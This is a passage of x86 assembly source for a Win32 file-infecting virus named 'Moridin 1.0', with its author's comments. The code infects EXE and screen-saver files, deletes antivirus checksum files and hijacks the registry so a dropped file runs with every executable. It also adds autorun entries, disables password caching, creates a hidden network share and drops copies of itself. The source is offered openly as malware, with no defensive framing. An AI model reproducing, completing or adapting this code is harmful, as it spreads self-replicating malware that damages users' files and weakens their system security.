   cmp     dword ptr [edx], "23me"         ; infect there.
   je      restore

   mov     dword ptr [ebp+offset nr_to_inf], 5 ; 5 files
   lea     ebx, [ebp+exe_files]            ; of type*.EXE
   call    infect_dir                      ; Infect them!


   mov     dword ptr [ebp+offset nr_to_inf], 5  ; 5 files
   lea     ebx, [ebp+scr_files]            ; of type *.SCR (screen savers)
   call    infect_dir                      ; Ok go on...


   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   RESTORE: Restore SEH frame, jump back to host
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Our work is now done, and we have to clean things up.

   restore:

   lea     edx, [ebp+Current_Dir]          ; Restore the orignal directory
   call    set_dir

   jmp     restore_seh

   exception_handler:
   mov     esp, dword ptr [esp+8]          ; Get preserved old stack.
   restore_seh:
   pop     dword ptr fs:[0]                ; restore old SEH from stack
   add     esp,4                           ; fix our old stack
   popad                                   ; get old register values from stack

   cmp     ebp,0                           ; if we are first generation, go to
   je      fake_end                        ; fake_end (MessageboxA, ExitProcess..)

   pop    dword ptr [ebp+old_imagebase]    ; Get saved orginal imagebase
   pop    dword ptr [ebp+old_eip]          ; Get saved orginal host entry point from
                                           ; stack.

   mov     esi,dword ptr [ebp+store_org_bytes] ; allocated memory zone
   lea     edi, org7bytes                      ; where to put it
   add     edi,ebp                             ; normalize with delta offset
   mov     ecx,7                               ; 7 bytes to copy
   cld                                         ; clear direction flag
   rep     movsb                               ; copy it...

   mov     eax,dword ptr [ebp+store_org_bytes] ; allocated memory
   push    eax
   call_   AGlobalFreeA                        ; free allocated memory!

   enc_screwed:

   mov     edi, dword ptr [ebp+old_eip]         ; where to restore
   add     edi, dword ptr [ebp+old_imagebase]   ; old bytes (in memory)
   push    edi
   mov     eax, dword ptr [ebp+org7bytes]       ; write back bytes...
   stosd                                        ; write back bytes...
   xor     eax,eax                              ; write back bytes...
   mov     ax, word ptr [ebp+org7bytes+4]       ; write back bytes...
   stosw                                        ; write back bytes...
   xor     eax,eax                              ; write back bytes...
   mov     al, byte ptr [ebp+org7bytes+6]       ; write back bytes...
   stosb                                        ; write back bytes...
   ret                                          ; return control to host

   nod_emul:                                    ; make emulators jump here

   virus_mess     db "-[W97-2K/Win32.Moridin 1.0] by Asmodeus iKX",13,10
                  db "Tia mi aven Moridin vadin",13,10
                  db '"The grave is no bar to my call"',0

   data_stuff:                                  ; Data stuff below..

   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   DATA: API names, buffers etc etc
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Here is stored all the data that the virus uses, it's poorly
   ;   commented, but what do you expect :) it's freakin data.

   kernel32_             dd  0
   advapi_dll_           dd  0

   jots_api_list:                                   ; all our APIs from kernel32

   AGetProcAddress       db "GetProcAddress",0
   AExitProcess          db "ExitProcess",0
   AGetCurrentDirectory  db "GetCurrentDirectoryA",0
   AGetWindowsDirectory  db "GetWindowsDirectoryA",0
   AGetSystemDirectory   db "GetSystemDirectoryA",0
   ASetCurrentDirectory  db "SetCurrentDirectoryA",0
   AFindFirstFileA       db "FindFirstFileA",0
   AFindNextFileA        db "FindNextFileA",0
   ACreateFileMapping    db "CreateFileMappingA",0
   AMapViewOfFile        db "MapViewOfFile",0
   AUnmapViewOfFile      db "UnmapViewOfFile",0
   AGetFileAttributes    db "GetFileAttributesA",0
   ASetFileAttributes    db "SetFileAttributesA",0
   ALoadLibrary          db "LoadLibraryA",0
   ACreateFile           db "CreateFileA",0
   ADeleteFile           db "DeleteFileA",0
   AWriteFile            db "WriteFile",0
   ACloseHandle          db "CloseHandle",0
   ASetFilePointer       db "SetFilePointer",0
   AGetFileSize          db "GetFileSize",0
   ASetEndOfFile         db "SetEndOfFile",0
   AGetSystemTime        db "GetSystemTime",0
   AGetTempPath          db "GetTempPathA",0
   Alstrcat              db "lstrcat",0
   AGetModuleHandle      db "GetModuleHandleA",0
   AGetModuleFileName    db "GetModuleFileNameA",0
   AGlobalAlloc          db "GlobalAlloc",0
   AGlobalFree           db "GlobalFree",0
   AGetTickCount         db "GetTickCount",0
   AGetFileTime          db "GetFileTime",0
   ASetFileTime          db "SetFileTime",0

                         db 0FFh

   jots_api_storage:
   AGetProcAddressA      dd 0
   AExitProcessA         dd 0
   AGetCurrentDirectoryA dd 0
   AGetWindowsDirectoryA dd 0
   AGetSystemDirectoryA  dd 0
   ASetCurrentDirectoryA dd 0
   AFindFirstFileAA      dd 0
   AFindNextFileAA       dd 0
   ACreateFileMappingA   dd 0
   AMapViewOfFileA       dd 0
   AUnmapViewOfFileA     dd 0
   AGetFileAttributesA   dd 0
   ASetFileAttributesA   dd 0
   ALoadLibraryA         dd 0
   ACreateFileA          dd 0
   ADeleteFileA          dd 0
   AWriteFileA           dd 0
   ACloseHandleA         dd 0
   ASetFilePointerA      dd 0
   AGetFileSizeA         dd 0
   ASetEndOfFileA        dd 0
   AGetSystemTimeA       dd 0
   AGetTempPathA         dd 0
   AlstrcatA             dd 0
   AGetModuleHandleA     dd 0
   AGetModuleFileNameA   dd 0
   AGlobalAllocA         dd 0
   AGlobalFreeA          dd 0
   AGetTickCountA        dd 0
   AGetFileTimeA         dd 0
   ASetFileTimeA         dd 0

   list_2:                                    ; APIs from ADVAPI32.DLL
   ARegCreateKey         db "RegCreateKeyA",0
   ARegCloseKey          db "RegCloseKey",0
   ARegSetValueEx        db "RegSetValueExA",0
   ARegDeleteKey         db "RegDeleteKeyA",0

                         db 0FFh
   storage_2:
   ARegCreateKeyA        dd 0
   ARegCloseKeyA         dd 0
   ARegSetValueExA       dd 0
   ARegDeleteKeyA        dd 0


   Address_of_func       dd 0
   Address_of_Names      dd 0
   Number_of_Names       dd 0
   Ord_Base              dd 0
   Address_of_Ord        dd 0

   hKey                  dd  ?

   lpsKey                db  'exefile\shell\open\command',0
   lpsKey_2              db  'Software\Microsoft\Windows\CurrentVersion\Network\LanMan\ASMODEUS$',0
   lpsKey_3              db  'Software\Microsoft\Windows\CurrentVersion\Run',0
   lpsKey_4              db  'Software\Microsoft\Windows\CurrentVersion\Policies',0
   lpsKey_5              db  'Software\Microsoft\Windows\CurrentVersion\Policies\Network',0
   lpsKey_6              db  'Software\Microsoft\Windows\CurrentVersion',0
   key_to_delete         db  'NoDriveAutoRun',0

   mmsys_value           db '"', 260 dup (0)
   mmsys_text            db '\MMSYSTEM.BIN" %1 %*',0
   winnt_text            db 'MMSYSTEM.BIN" %1 %*',0
   winnt_temp            db '"', 260 dup (0)
   winnt_drop            db 260 dup (0)
   winnt_shit            db 260 dup (0)
   check_name            db 260 dup (0)
   ThisFile              db 260 dup (0)

   Name_1                db  'Flags',0
   Name_2                db  'Parm1enc',0
   Name_3                db  'Parm2enc',0
   Name_4                db  'Path',0
   Name_5                db  'Remark',0
   Name_6                db  'Type',0
   Name_7                db  'mmsystem',0
   Name_8                db  'DisablePwdCaching',0
   Name_9                db  'WinDrop',0

   Value_Flags     dd 392h
   Flags_len  = $ - offset Value_Flags

   Value_Type   dd 0h
   Type_len = $ - offset Value_Type

   Value_Discache  dd 0h
   Discache_len = $ - offset Value_Discache

   Value_parm1  db 07ch,0d1h,015h
   Parm1_len = $ - offset Value_parm1

   Value_parm2  db 0
   Parm2_len = $ - offset Value_parm2

   Value_path   db 'C:\',0
   Path_len = $ - offset Value_path

   Value_remark db '',0
   Remark_len = $ - offset Value_remark


   file_3                  db "PACKED.EXE",0
   file_5                  db "ADVAPI33.EXE",0
   file_4                  db "COMMDLG.VBS",0
   file_6                  db "MMSYSTEM.BIN",0
   advapi_dll              db "ADVAPI32",0

   ; This are the not *so* welcome files, better rid myself of them :)

   black_listed:
                   db      011h
   first_victim    db "CHKLIST.MS",0
                   db      011h
                   db "CHKLIST.DAT",0
                   db      011h
                   db "CHKLIST.CPS",0
                   db      011h
                   db "CHKLIST.TAV",0
                   db      011h
                   db "AGUARD.DAT",0 ; <-- Thanks billy, had no idea those
                   db      011h      ;     exsisted ;-)
                   db "AVGQT.DAT",0  ; <-- also :)
                   db      011h
                   db "ANTI-VIR.DAT",0
                   db      011h
                   db "SMARTCHK.MS",0
                   db      011h
                   db "SMARTCHK.CPS",0
                   db      011h
                   db "IVP.NTZ",0
                   db      011h
                   db "AVP.CRC",0
                   db      0FFh

   file_offset             dd 0
   filehandle_             dd 0
   search_handle           dd 0
   maphandle               dd 0
   mapaddress              dd 0
   filehandle              dd 0
   attribs                 dd 0
   newfilesize             dd ?
   pe_header               dd 0
   last_section_header     dd 0
   new_eip                 dd 0
   where2write             dd 0
   num_bytes_written       dd ?
   file_align              dd 0
   mem_align               dd 0
   memory                  dd 0
   memory_2                dd 0
   name_index              dd 0
   tempkrn32               dd 0
   what_OS                 dd 0
   systemtime              dw 8 dup (0)
   Win_Dir                 db 260 dup(0)
   Win_Sys_Dir             db 260 dup(0)
   Current_Dir             db 260 dup(0)
   outlook_                db "COMMDLG.VBS",0
   hardcore_temp           db "C:\TEMP\",0
   exe_files               db "*.EXE",0
   scr_files               db "*.SCR",0
   root                    db "C:\",0
   nr_to_inf               dd 0

   FT_creation             dq 0
   FT_lastwrite            dq 0
   FT_lastaccess           dq 0

   filetime                        STRUC
           FT_dwLowDateTime        DD ?
           FT_dwHighDateTime       DD ?
   filetime                        ENDS

   win32_find_data                 STRUC
           FileAttributes          DD ?
           CreationTime            filetime ?
           LastAccessTime          filetime ?
           LastWriteTime           filetime ?
           FileSizeHigh            DD ?
           FileSizeLow             DD ?
           Reserved0               DD ?
           Reserved1               DD ?
           FileName                DB max_path DUP (?)
           AlternateFileName       DB 13 DUP (?)
                                   DB 3 DUP (?)
   win32_find_data                 ENDS

   search    win32_find_data ?

   include mor_drop.inc

   get_kernel32:

   mov     edx, dword ptr [ebp+the_stack]  ; the stack (in pages)
   mov     ecx,5                           ; check 50 pages down
   kernel32_loop:
   cmp     word ptr [edx],'ZM'             ; MZ found? if so we found
   jz      found_mz_in_mem                 ; kernel32.dll base address
   sub     edx,10000h                      ; Go down 10 pages each time.
   loop    kernel32_loop                   ; loop it..
   jmp     error_kernel32

   found_mz_in_mem:

   xchg    eax,edx                         ; EAX= kernel32.dll address
   mov     [ebp+kernel32_],eax             ; save it...
   ret
   error_kernel32:
   xor     eax,eax                         ; on error EAX = 0
   ret

   get_apis:

   mov     esi,[ebp+kernel32_]             ; ESI= kernel32 base address
   cmp     word ptr [esi],"ZM"             ; check if valid
   jne     getout                          ; if not get out of here.
   mov     edi, [esi+3ch]                  ; old mz_header+3ch = pointer
   add     edi, [ebp+kernel32_]            ; to PE header
   cmp     word ptr [edi],"EP"             ; Normalize with k32 base address
   jne     getout                          ; check if it's a PE.

   pushad                                  ; save registers
   mov     esi, [edi+120d]                 ; ESI = Export directory
   add     esi, [ebp+offset kernel32_]     ; Normalize

   mov     eax,dword ptr [esi+24d]
   add     eax,[ebp+kernel32_]
   mov     dword ptr [ebp+Number_of_Names],eax  ; Save # of names
   mov     eax,dword ptr [esi+28d]
   add     eax,[ebp+kernel32_]
   mov     dword ptr [ebp+Address_of_func],eax  ; Save address of functions
   mov     eax,dword ptr [esi+32d]
   add     eax,[ebp+kernel32_]
   mov     dword ptr [ebp+Address_of_Names],eax; ; Save address of names
   mov     eax,dword ptr [esi+36d]
   add     eax,[ebp+kernel32_]
   mov     dword ptr [ebp+Address_of_Ord],eax    ; Save address of ordinals
   mov     esi, dword ptr [ebp+Address_of_func]
   lodsd                                   ; Load dword from ESI into EAX
   add     eax, [ebp+kernel32_]            ; Normalize it
   mov     esi, [ebp+Address_of_Names]     ; EAX= Address of functions
   mov     [ebp+name_index], esi           ; EDI = Address of names VA
   mov     edi, [esi]
   add     edi, [ebp+kernel32_]
   xor     ecx,ecx
   mov     ebx, offset jots_api_list       ; EBX = start of API list
   add     ebx, ebp                        ; adjust delta offset

   try_more:
   mov     esi,ebx                         ; Get API name into ESI
   match_it:                               ;
   cmpsb                                   ; Compare ESI,EDI
   jne     check_next                      ; If not equal then check
   cmp     byte ptr [edi],0                ; Next API
   je      got_it
   jmp     match_it
   check_next:
   inc     cx
   cmp     cx, word ptr [ebp+Number_of_Names]   ; Reached total amount of
   jge     getout                          ; of APIs?
   add     dword ptr [ebp+name_index],4    ; Get next Name arrey
   mov     esi, [ebp+name_index]           ; ESI address of names (RVA) + 4
   mov     edi, [esi]                      ; EDI address of names (VA)
   add     edi,[ebp+kernel32_]
   jmp     try_more

   got_it:
   shl      ecx, 1                         ; Multiply ECX with (2^1) (byte->word)
   mov      eax,ecx                        ; Save ECX -> EAX
   add      eax,dword ptr [ebp+Address_of_Ord]    ; APIs Location in address of Ordinals
   xor      esi,esi                        ;
   xchg     eax,esi
   lodsw
   shl      eax,2                          ; Multiply EAX with (2^2) (dword)
   add      eax,dword ptr [ebp+Address_of_func]   ; API location in address of
   mov      esi,eax                        ; functions
   lodsd
   add      eax,[ebp+kernel32_]            ; normalize it
   int     3h
   mov     [ebp+AGetProcAddressA], eax     ; We got our GetProcAdd API!
   popad

   lea     esi, AExitProcess               ; ESI= What API we want = ExitProcess
   lea     edi, AExitProcessA              ; EDI= Where to put it
   add     esi, ebp                        ; normalize ESI
   add     edi, ebp                        ; normalize EDI

   get_all_apis:
   push    esi
   mov     eax, [ebp+kernel32_]            ; API fetching loop
   push    eax                             ; with GetProcAddress
   call_   AGetProcAddressA                ; ...
   test    eax,eax
   je      getout
   stosd

   more_inc:
   inc     esi                             ; go up 1 byte
   cmp     byte ptr [esi], 0               ; is it end of API?
   jne     more_inc                        ; if not keep inc:ing till we get there
   inc     esi                             ; ESI = start of next API
   cmp     byte ptr [esi], 0FFh            ; is it the last? if it is, get out
   jne     get_all_apis                    ;
   getout:
   ret

   set_dir:

   push       edx
   call_      ASetCurrentDirectoryA        ; Change current directory to what
   ret                                     ; EDX points to.


   set_nt_reg:

   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Registry Modification : Here we will modify/create a lot of new values
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   We must change the registry so our MMSYSTEM.BIN will be in control
   ;   of execution flow :) Also add to registry a value so COMMDLG.VBS
   ;   will be executed at boot up.

   lea     eax, [ebp+winnt_text]           ; It will change the system regitry
   push    eax                             ; Look at the values for more
   lea     eax, [ebp+winnt_temp]           ; information...
   push    eax
   call_   AlstrcatA

   lea       eax, [ebp+winnt_shit]
   push      eax
   push      dword ptr 260
   call_     AGetTempPathA

   lea       eax, [ebp+outlook_]
   push      eax
   lea       eax, [ebp+winnt_shit]
   push      eax
   call_     AlstrcatA

   lea     eax,[ebp+hKey]
   push    eax
   lea     eax,[ebp+lpsKey]
   push    eax
   push    HKEY_CLASSES_ROOT
   call_   ARegCreateKeyA
   inc     eax
   test    eax,eax
   je      error_reg_temp

   push    260
   lea     eax,[ebp+winnt_temp]
   push    eax
   push    1
   push    0h
   push    0h
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegCloseKeyA

   lea     eax,[ebp+hKey]
   push    eax
   lea     eax,[ebp+lpsKey_3]
   push    eax
   push    HKEY_LOCAL_MACHINE
   call_   ARegCreateKeyA

   push    260d
   lea     eax,[ebp+winnt_shit]
   push    eax
   push    REG_SZ
   push    0h
   lea     eax,[ebp+Name_7]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegCloseKeyA

   lea     eax,[ebp+hKey]
   push    eax
   lea     eax,[ebp+lpsKey_4]
   push    eax
   push    HKEY_LOCAL_MACHINE
   call_   ARegCreateKeyA

   lea     eax, [ebp+key_to_delete]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegDeleteKeyA

   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegCloseKeyA

   lea     eax,[ebp+hKey]
   push    eax
   lea     eax,[ebp+lpsKey_5]
   push    eax
   push    HKEY_LOCAL_MACHINE
   call_   ARegCreateKeyA

   push    [Discache_len]
   lea     eax,[ebp+Value_Discache]
   push    eax
   push    REG_DWORD
   push    0h
   lea     eax,[ebp+Name_8]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegCloseKeyA
   error_reg_temp:
   ret


   set_reg:


   push    260
   lea     eax, [ebp+mmsys_value+1]
   push    eax
   call_   AGetSystemDirectoryA

   lea     eax, [ebp+mmsys_text]
   push    eax
   lea     eax, [ebp+mmsys_value]
   push    eax
   call_   AlstrcatA


   lea     eax,[ebp+hKey]
   push    eax
   lea     eax,[ebp+lpsKey]
   push    eax
   push    HKEY_CLASSES_ROOT
   call_   ARegCreateKeyA
   inc     eax
   test    eax,eax
   je      error_reg_system

   push    260
   lea     eax,[ebp+mmsys_value]
   push    eax
   push    1
   push    0h
   push    0h
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegCloseKeyA

   ;-------------------
   lea     eax,[ebp+hKey]
   push    eax
   lea     eax,[ebp+lpsKey_3]
   push    eax

   push    HKEY_LOCAL_MACHINE
   call_   ARegCreateKeyA

   push    260d
   lea     eax,[ebp+outlook_]
   push    eax
   push    REG_SZ
   push    0h
   lea     eax,[ebp+Name_7]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegCloseKeyA
   ;-------------------

   ;1
   lea     eax,[ebp+hKey]
   push    eax
   lea     eax,[ebp+lpsKey_2]
   push    eax
   push    HKEY_LOCAL_MACHINE
   call_   ARegCreateKeyA

   ;2
   push    [Flags_len]
   lea     eax,[ebp+Value_Flags]
   push    eax
   push    REG_DWORD
   push    0h
   lea     eax,[ebp+Name_1]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   ;3
   push    [Parm1_len]
   lea     eax,[ebp+Value_parm1]
   push    eax
   push    REG_BINARY
   push    0h
   lea     eax,[ebp+Name_2]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   ;4
   push    [Parm2_len]
   lea     eax,[ebp+Value_parm2]
   push    eax
   push    REG_BINARY
   push    0h
   lea     eax,[ebp+Name_3]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   ;5
   push    [Path_len]
   lea     eax,[ebp+Value_path]
   push    eax
   push    REG_SZ
   push    0h
   lea     eax,[ebp+Name_4]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   push    [Remark_len]
   lea     eax,[ebp+Value_remark]
   push    eax
   push    REG_SZ
   push    0h
   lea     eax,[ebp+Name_5]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   push    [Type_len]
   lea     eax,[ebp+Value_Type]
   push    eax
   push    REG_DWORD
   push    0h
   lea     eax,[ebp+Name_6]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegCloseKeyA

   lea     eax,[ebp+hKey]
   push    eax
   lea     eax,[ebp+lpsKey_4]
   push    eax
   push    HKEY_LOCAL_MACHINE
   call_   ARegCreateKeyA

   lea     eax, [ebp+key_to_delete]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegDeleteKeyA

   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegCloseKeyA

   lea     eax,[ebp+hKey]
   push    eax
   lea     eax,[ebp+lpsKey_5]
   push    eax
   push    HKEY_LOCAL_MACHINE
   call_   ARegCreateKeyA

   push    [Discache_len]
   lea     eax,[ebp+Value_Discache]
   push    eax
   push    REG_DWORD
   push    0h
   lea     eax,[ebp+Name_8]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegCloseKeyA
   error_reg_system:
   ret


   mark_reg_drop:

   lea     eax,[ebp+hKey]
   push    eax
   lea     eax,[ebp+lpsKey_6]
   push    eax
   push    HKEY_LOCAL_MACHINE
   call_   ARegCreateKeyA

   push    260d
   push    ebx
   push    REG_SZ
   push    0h
   lea     eax,[ebp+Name_9]
   push    eax
   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegSetValueExA

   mov     eax,[ebp+hKey]
   push    eax
   call_   ARegCloseKeyA

   ret

   kill_em:
   push    edi
   call_   ADeleteFileA
   ret

   create_file:

   mov     word ptr [ebp+createflag], 0
   push    0
   push    80h
   push    2
   push    0
   push    1
   push    40000000h
   push    eax
   call_   ACreateFileA
   inc     eax
   test    eax,eax
   je      error_open
   dec     eax
   mov     dword ptr [ebp+filehandle_],eax
   ret
   error_open:
   mov     word ptr [ebp+createflag], 0FFh
   ret

   write_file:
   push    0
   lea     ebx, [ebp+num_bytes_written]    ; buffer to recieve # bytes written
   push    ebx
   push    ecx                             ; Size of code to write
   push    eax                             ; where to start read
   push    dword ptr [ebp+filehandle_]
   call_   AWriteFileA
   ret

   close_file_:
   push    eax
   call_   ACloseHandleA
   ret

   align_it:
   xor     edx,edx                         ; EAX = orginal size, EDI = virus size
   add     eax,edi                         ; EAX = EAX+EDI
   push    eax                             ; save on stack
   div     ecx                             ; divide new size with align value
   sub     ecx,edx                         ; EDX = remainder, ECX = alignvalue
   pop     eax                             ; - remainder = bytes to pad
   add     eax,ecx                         ; pad the orginal size
   ret

   drop_files:

   mov     word ptr [ebp+dropflag], 0

   lea     eax,[ebp+file_5]
   call    create_file
   cmp     word ptr [ebp+createflag], 0FFh
   je      try_next_drop
   lea     eax,[ebp+dropper_start]
   mov     ecx,dropper_len
   call    write_file

   mov     eax,dword ptr [ebp+filehandle_]
   call    close_file_

   try_next_drop:

   lea     eax,[ebp+file_3]
   call    create_file
   cmp     word ptr [ebp+createflag], 0FFh
   je      try_next_1
   lea     eax,[ebp+dropper_start]
   mov     ecx,dropper_len
   call    write_file

   mov     eax,dword ptr [ebp+filehandle_]
   call    close_file_

   try_next_1:

   push    260d
   lea     eax, [ebp+ThisFile]
   push    eax
   push    0
   call_   AGetModuleFileNameA

   lea     eax, [ebp+ThisFile]
   xor     ecx,ecx
   loop_exst:
   inc     eax
   inc     ecx
   cmp     ecx,128d
   je      ok_cont_drop
   cmp     dword ptr [eax],"NIB."
   jne     loop_exst
   jmp     try_next_2

   ok_cont_drop:

   lea     eax,[ebp+file_6]
   call    create_file
   cmp     word ptr [ebp+createflag], 0FFh
   je      try_next_2
   lea     eax,[ebp+dropper_start]
   mov     ecx,dropper_len
   call    write_file

   mov     eax,dword ptr [ebp+filehandle_]
   call    close_file_

   try_next_2:

   mov     word ptr [ebp+createflag], 0

   lea     eax,[ebp+file_4]
   call    create_file
   cmp     word ptr [ebp+createflag], 0FFh
   je      error_drop
   lea     eax,[ebp+outlook_start]
   mov     ecx,outlook_len
   call    write_file

   mov     eax,dword ptr [ebp+filehandle_]
   call    close_file_
   mov     word ptr [ebp+ dropflag], 0
   mov     word ptr [ebp+createflag], 0
   ret
   error_drop:
   mov     word ptr [ebp+ dropflag], 0FFh
   ret

   infect_dir:

   lea     eax,[ebp+search]
   push    eax
   push    ebx
   call_   AFindFirstFileAA
   inc     eax
   jz      no_file_found
   dec     eax
   mov     dword ptr [ebp+search_handle],eax

   lea     edi, [ebp+search]
   lea     esi, [edi.FileName]
   mov     ecx, [edi.FileSizeLow]

   push    edi
   push    esi
   push    ecx

   call    av_list
   test    eax,eax
   je      no_inf

   push    260d
   lea     eax,[ebp+check_name]
   push    eax
   push    0
   call_   AGetModuleFileNameA
   lea     eax,[ebp+check_name]
   check_loop_1:
   inc     eax
   cmp     byte ptr [eax], "."
   jne     check_loop_1
   check_loop_2:
   dec     eax
   cmp     byte ptr [eax], "\"
   jne     check_loop_2
   inc     eax
   mov     edi,esi
   mov     esi,eax
   check_replica:
   cmpsb
   jne     not_replica_1
   cmp     byte ptr [edi],0
   je      no_inf
   jmp     check_replica

   not_replica_1:

   pop     ecx
   pop     esi
   pop     edi

   call    Infect_File
   jmp     find_next

   no_inf:

   pop     ecx
   pop     esi
   pop     edi


   find_next:
   lea     edi, [ebp+search]
   lea     edi, [edi.FileName]
   mov     ecx, 13d
   mov     al, 0
   rep     stosb


   lea     edi, [ebp+check_name]
   mov     ecx, 260d
   mov     al, 0
   rep     stosb

   lea     eax,[ebp+search]
   push    eax
   mov     eax,dword ptr [ebp+search_handle]
   push    eax
   call_   AFindNextFileAA

   test    eax, eax
   jz      no_file_found
   lea     edi, [ebp+search]
   lea     esi, [edi.FileName]
   mov     ecx, [edi.FileSizeLow]

   push    edi
   push    esi
   push    ecx

   call    av_list
   test    eax,eax
   je      error_inf_2

   push    260d
   lea     eax,[ebp+check_name]
   push    eax
   push    0
   call_   AGetModuleFileNameA
   lea     eax,[ebp+check_name]
   check_loop_3:
   inc     eax
   cmp     byte ptr [eax], "."
   jne     check_loop_3
   check_loop_4:
   dec     eax
   cmp     byte ptr [eax], "\"
   jne     check_loop_4
   inc     eax
   mov     edi,esi
   mov     esi,eax
   check_replica_2:
   cmpsb
   jne     not_replica_2
   cmp     byte ptr [edi],0
   je      error_inf_2
   jmp     check_replica_2

   not_replica_2:

   pop     ecx
   pop     esi
   pop     edi

   call    Infect_File
   jc      error_inf

   dec     dword ptr [ebp+offset nr_to_inf]
   cmp     dword ptr [ebp+offset nr_to_inf], 0
   jne     find_next
   jmp     error_inf
   error_inf_2:
   pop     ecx
   pop     esi
   pop     edi
   error_inf:
   cmp     dword ptr [ebp+nr_to_inf], 0
   jne     find_next
   no_file_found:
   push    dword ptr [ebp+search_handle]
   call_   ACloseHandleA
   ret


   Infect_File:

   pushad
   mov     word ptr [ebp+infectionflag], 0
   mov     dword ptr [ebp+memory],ecx
   mov     dword ptr [ebp+newfilesize],ecx
   mov     dword ptr [ebp+file_offset],esi

   push    esi
   call_   AGetFileAttributesA
   test    eax,eax
   je      infection_error
   mov     [ebp+attribs], eax
   error1:
   push    80h
   push    esi
   call_   ASetFileAttributesA

   call    inf_open_file
   inc     eax
   test    eax,eax
   je      infection_error
   dec     eax
   mov     [ebp+offset filehandle], eax

   lea     edx,FT_creation
   add     edx,ebp
   push    edx
   add     edx, 8
   push    edx
   add     edx, 8
   push    edx
   push    eax
   call_   AGetFileTimeA

   mov     ecx, dword ptr [ebp+memory]
   call    map_file
   mov     [ebp+offset maphandle], eax
   test    eax,eax
   jz      close_file

   call    map_view_file
   cmp     eax, esi
   je      close_map
   mov     esi, eax
   mov     [ebp+offset mapaddress], esi

   cmp     word ptr [esi], "ZM" ; Check if old-dos header has MZ signature
   jne     get_out
   cmp     word ptr [esi+12h],666d
   jne     ok_go
   mov     word ptr [ebp+infectionflag], 0FFh
   jmp     get_out

   ok_go:

   mov     ebx, dword ptr [esi+3ch] ; Get RVA address of new-exe header
   cmp     ebx,900
   ja      get_out
   add     ebx, esi

   cmp     word ptr [ebx], "EP"   ; Check if it's a PE file, if not bail out
   jne     get_out


   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   *BUG FIX*
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   After a friend of mine accidently got infected, I learned that winzip
   ;   self-extractors are to be avoided! First of all they have a self-valida
   ;   tion check, also they crash sometimes when infected. The WinZip self-
   ;   extractors are usual exe files, but on the second section + 16 bytes
   ;   there is a little copyright string :)) if it's there in the file
   ;   we're about to infect we avoid infecting it.

   pushad
   mov     esi, dword ptr [ebx+116d]
   imul    esi,esi,8d
   add     esi,78h
   add     esi,ebx
   add     esi,40d
   mov     edx,dword ptr [esi+physical_offset]
   add     edx,dword ptr [ebp+mapaddress]
   add     edx,16d
